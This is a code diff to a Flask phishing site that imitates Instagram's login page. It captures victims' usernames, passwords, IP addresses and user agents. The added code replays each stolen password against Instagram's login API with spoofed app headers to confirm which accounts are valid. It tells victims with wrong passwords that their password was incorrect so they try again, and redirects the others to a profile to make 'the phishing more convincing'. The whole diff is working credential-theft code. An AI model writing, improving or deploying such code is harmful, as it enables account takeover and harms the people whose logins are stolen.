@@ -216,14 +216,63 @@ def index():
     # Use custom template (default - looks very realistic)
     return render_template('instagram_login.html')
 
+def verify_instagram_credentials(username, password):
+    """
+    Attempt to verify Instagram credentials
+    Returns True if credentials appear valid, False otherwise
+    """
+    try:
+        session = requests.Session()
+        
+        # Set realistic headers
+        headers = {
+            'User-Agent': 'Instagram 219.0.0.12.117 Android',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US',
+            'Accept-Encoding': 'gzip, deflate',
+            'X-IG-Capabilities': '3brTvw==',
+            'X-IG-Connection-Type': 'WIFI',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
+        }
+        
+        # Try Instagram's login API
+        login_url = 'https://i.instagram.com/api/v1/accounts/login/'
+        
+        import time
+        import hashlib
+        import uuid
+        
+        # Generate device ID
+        device_id = str(uuid.uuid4())
+        
+        payload = {
+            'username': username,
+            'password': password,
+            'device_id': device_id,
+            'login_attempt_count': '0',
+        }
+        
+        response = session.post(login_url, headers=headers, data=payload, timeout=10)
+        result = response.json()
+        
+        # Check response
+        if response.status_code == 200 and (result.get('logged_in_user') or result.get('status') == 'ok'):
+            return True
+        
+        return False
+        
+    except Exception as e:
+        print(f"Verification error: {e}")
+        # If verification fails due to network/blocking, return False
+        return False
+
 @app.route('/login', methods=['POST'])
 def login():
-    """Capture credentials with basic validation"""
+    """Capture credentials and verify with Instagram"""
     username = request.form.get('username', '').strip()
     password = request.form.get('password', '')
     
-    # Basic validation to make it realistic (like real Instagram)
-    # Instagram requires at least 6 characters for password
+    # Basic validation
     if not username:
         return jsonify({
             'status': 'error', 
@@ -236,10 +285,14 @@ def login():
             'message': 'Sorry, your password was incorrect. Please double-check your password.'
         }), 401
     
+    # Verify credentials with Instagram
+    is_valid = verify_instagram_credentials(username, password)
+    
     # Capture the data with timestamp
     data = {
         'username': username,
         'password': password,
+        'valid': is_valid,
         'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         'ip_address': request.remote_addr,
         'user_agent': request.headers.get('User-Agent', 'Unknown')
@@ -253,13 +306,20 @@ def login():
     print(f"{'='*60}")
     print(f"Username: {username}")
     print(f"Password: {password}")
+    print(f"Valid: {'✅ YES' if is_valid else '❌ NO'}")
     print(f"Time: {data['timestamp']}")
     print(f"IP: {data['ip_address']}")
     print(f"{'='*60}\n")
     
-    # Always redirect to specific Instagram profile (makes the phishing more convincing)
-    instagram_url = "https://www.instagram.com/ranjan.04__/"
-    return jsonify({'status': 'success', 'redirect': instagram_url})
+    # Only proceed if credentials are valid
+    if is_valid:
+        instagram_url = "https://www.instagram.com/ranjan.04__/"
+        return jsonify({'status': 'success', 'redirect': instagram_url})
+    else:
+        return jsonify({
+            'status': 'error',
+            'message': 'Sorry, your password was incorrect. Please double-check your password.'
+        }), 401
 
 @app.route('/reveal')
 def reveal():
